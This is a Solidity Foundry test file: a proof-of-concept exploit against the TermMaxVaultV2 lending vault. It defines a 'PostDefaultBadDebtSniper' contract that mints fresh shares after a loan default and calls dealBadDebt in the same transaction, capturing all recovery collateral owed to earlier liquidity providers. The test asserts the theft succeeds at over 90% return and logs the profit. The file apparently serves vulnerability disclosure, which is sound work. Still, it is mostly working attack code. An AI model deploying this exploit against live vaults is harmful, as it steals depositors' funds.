// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IERC20Metadata} from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
import {console2} from "forge-std/console2.sol";

import {TermMaxVaultV2} from "contracts/v2/vault/TermMaxVaultV2.sol";
import {VaultTestV2} from "./VaultV2.t.sol";
import {LoanUtils} from "./utils/LoanUtils.sol";

/// @notice Executes mint -> dealBadDebt atomically from a contract that had no
/// vault shares before the bad debt was recognized.
contract PostDefaultBadDebtSniper {
    using SafeERC20 for IERC20;

    TermMaxVaultV2 public immutable vault;
    IERC20 public immutable asset;
    IERC20 public immutable collateral;

    constructor(TermMaxVaultV2 vault_, IERC20 asset_, IERC20 collateral_) {
        vault = vault_;
        asset = asset_;
        collateral = collateral_;
    }

    function attack(uint256 sharesToMint, uint256 badDebt, address beneficiary)
        external
        returns (uint256 capitalUsed, uint256 sharesBurned, uint256 collateralOut, uint256 residualShares)
    {
        capitalUsed = vault.previewMint(sharesToMint);

        asset.safeTransferFrom(msg.sender, address(this), capitalUsed);
        asset.forceApprove(address(vault), capitalUsed);

        // Both operations execute in one transaction. The vault's transient
        // deposit/withdraw action guard does not cover dealBadDebt().
        vault.mint(sharesToMint, address(this));
        (sharesBurned, collateralOut) =
            vault.dealBadDebt(address(collateral), badDebt, address(this), address(this));

        residualShares = vault.balanceOf(address(this));
        collateral.safeTransfer(beneficiary, collateralOut);
    }
}

/// @notice Focused PoC built on TermMax's own VaultTestV2 fixture.
///
/// It proves all of the following in one test:
/// 1. recovery collateral is claimable by pre-default LP shares;
/// 2. a contract with zero pre-default shares cannot claim it;
/// 3. after bad debt is publicly recorded, the same contract can atomically
///    mint fresh shares and consume the entire recovery collateral;
/// 4. the pre-default LP's share balance is unchanged, yet its recovery
///    collateral is gone;
/// 5. collateral oracle value exceeds attack capital while all residual
///    attacker shares are deliberately valued at zero.
contract VaultBadDebtPostDefaultDepositPoC is VaultTestV2 {
    function test_PostDefaultDepositAtomicallyCapturesPreDefaultRecoveryCollateral() public {
        // Generate a clean vault lending position.
        vm.warp(currentTime + 2 days);
        buyXt(48.219178e8, 1000e8);

        // VaultTestV2 seeds the market with an unrelated 10,000e18 FT/XT pair
        // solely for other tests. Burn that matched pair through the ordinary
        // market path so this PoC measures only the vault order and borrower.
        vm.prank(deployer);
        res.market.burn(deployer, 10000e18);

        // Create a genuinely overcollateralized position: 1,000 debt tokens
        // against 1 collateral token priced at 2,000 debt tokens.
        address borrower = makeAddr("borrower");
        vm.startPrank(borrower);
        LoanUtils.fastMintGt(res, borrower, 1000e8, 1e18);
        vm.stopPrank();

        // Settle after maturity + liquidation window. badDebt and delivered
        // collateral are now fixed and publicly observable.
        vm.warp(currentTime + 92 days);
        vm.prank(curator);
        (uint256 badDebt, uint256 deliveredCollateral) = vault.redeemOrder(res.order);

        uint256 recoveryCollateral = res.collateral.balanceOf(address(vault));
        assertGt(badDebt, 0, "setup did not create bad debt");
        assertGt(recoveryCollateral, 0, "setup did not deliver collateral");
        assertEq(vault.badDebtMapping(address(res.collateral)), badDebt);
        assertEq(deliveredCollateral, recoveryCollateral);

        uint256 recoveryValueInDebtRaw = _collateralValueInDebtRaw(recoveryCollateral);

        // In this first-party fixture the unpaid position is 50% LTV, so the
        // physical-delivery collateral is worth approximately 2x the nominal
        // bad debt. A 1% tolerance covers integer rounding in proportional
        // market redemption.
        assertGe(
            recoveryValueInDebtRaw,
            Math.mulDiv(badDebt, 199, 100),
            "fixture did not preserve overcollateralized recovery value"
        );

        uint256 oldLpSharesBefore = vault.balanceOf(deployer);
        uint256 oldLpSupplyBefore = vault.totalSupply();
        assertGt(oldLpSharesBefore, 0, "pre-default LP has no shares");

        // Counterfactual control: before the attacker enters, the original LP
        // can burn its pre-default shares and receive all recovery collateral.
        uint256 snapshotId = vm.snapshot();
        vm.prank(deployer);
        (uint256 oldLpSharesBurned, uint256 oldLpCollateralOut) =
            vault.dealBadDebt(address(res.collateral), badDebt, deployer, deployer);
        assertGt(oldLpSharesBurned, 0);
        assertEq(oldLpCollateralOut, recoveryCollateral);
        assertEq(res.collateral.balanceOf(deployer), recoveryCollateral);
        assertTrue(vm.revertTo(snapshotId), "failed to restore pre-attack state");

        PostDefaultBadDebtSniper sniper = new PostDefaultBadDebtSniper(
            vault, IERC20(address(res.debt)), IERC20(address(res.collateral))
        );
        address attacker = makeAddr("post-default-attacker");

        // Neither the beneficiary nor the execution contract had any vault
        // exposure when the loss and recovery collateral were created.
        assertEq(vault.balanceOf(attacker), 0);
        assertEq(vault.balanceOf(address(sniper)), 0);

        // Negative control: zero pre-default shares cannot claim recovery.
        vm.prank(address(sniper));
        vm.expectRevert();
        vault.dealBadDebt(address(res.collateral), badDebt, address(sniper), address(sniper));

        // Buy just enough fresh shares after default. Ten raw share units are
        // only a rounding buffer; any residual shares are assigned zero value.
        uint256 sharesToMint = vault.previewWithdraw(badDebt) + 10;
        uint256 quotedCapital = vault.previewMint(sharesToMint);
        res.debt.mint(attacker, quotedCapital);

        vm.startPrank(attacker);
        res.debt.approve(address(sniper), quotedCapital);
        (
            uint256 capitalUsed,
            uint256 attackerSharesBurned,
            uint256 attackerCollateralOut,
            uint256 residualShares
        ) = sniper.attack(sharesToMint, badDebt, attacker);
        vm.stopPrank();

        assertEq(capitalUsed, quotedCapital);
        assertGt(attackerSharesBurned, 0);
        assertLe(attackerSharesBurned, sharesToMint);
        assertEq(residualShares, sharesToMint - attackerSharesBurned);

        // The post-default entrant consumes the entire pre-existing recovery.
        assertEq(attackerCollateralOut, recoveryCollateral);
        assertEq(res.collateral.balanceOf(attacker), recoveryCollateral);
        assertEq(res.collateral.balanceOf(address(vault)), 0);
        assertEq(vault.badDebtMapping(address(res.collateral)), 0);

        // Existing LP shares were not burned or transferred, but the recovery
        // they could claim in the counterfactual branch is now gone.
        assertEq(vault.balanceOf(deployer), oldLpSharesBefore);
        assertEq(vault.totalSupply(), oldLpSupplyBefore + residualShares);

        vm.prank(deployer);
        vm.expectRevert();
        vault.dealBadDebt(address(res.collateral), badDebt, deployer, deployer);

        uint256 collateralValueInDebtRaw = _collateralValueInDebtRaw(attackerCollateralOut);

        // Conservative profit ignores all residual attacker shares.
        assertGt(
            collateralValueInDebtRaw,
            capitalUsed,
            "recovery collateral does not exceed attack capital"
        );
        uint256 conservativeProfit = collateralValueInDebtRaw - capitalUsed;
        uint256 conservativeRoiBps = Math.mulDiv(conservativeProfit, 10_000, capitalUsed);
        assertGt(conservativeRoiBps, 9_000, "conservative ROI is below 90%");

        console2.log("bad_debt_raw", badDebt);
        console2.log("attack_capital_raw", capitalUsed);
        console2.log("fresh_shares_minted", sharesToMint);
        console2.log("fresh_shares_burned", attackerSharesBurned);
        console2.log("residual_shares_ignored", residualShares);
        console2.log("recovery_collateral_raw", attackerCollateralOut);
        console2.log("collateral_value_in_debt_raw", collateralValueInDebtRaw);
        console2.log("conservative_profit_raw", conservativeProfit);
        console2.log("conservative_roi_bps", conservativeRoiBps);
        console2.log("old_lp_shares_unchanged", oldLpSharesBefore);
    }

    function _collateralValueInDebtRaw(uint256 collateralAmount) internal view returns (uint256) {
        (uint256 collateralPrice, uint8 collateralPriceDecimals) =
            res.oracle.getPrice(address(res.collateral));
        (uint256 debtPrice, uint8 debtPriceDecimals) = res.oracle.getPrice(address(res.debt));

        uint256 numeratorScale =
            (10 ** IERC20Metadata(address(res.debt)).decimals()) * (10 ** debtPriceDecimals);
        uint256 denominatorScale =
            (10 ** IERC20Metadata(address(res.collateral)).decimals()) * (10 ** collateralPriceDecimals);

        return Math.mulDiv(
            collateralAmount,
            collateralPrice * numeratorScale,
            denominatorScale * debtPrice
        );
    }
}
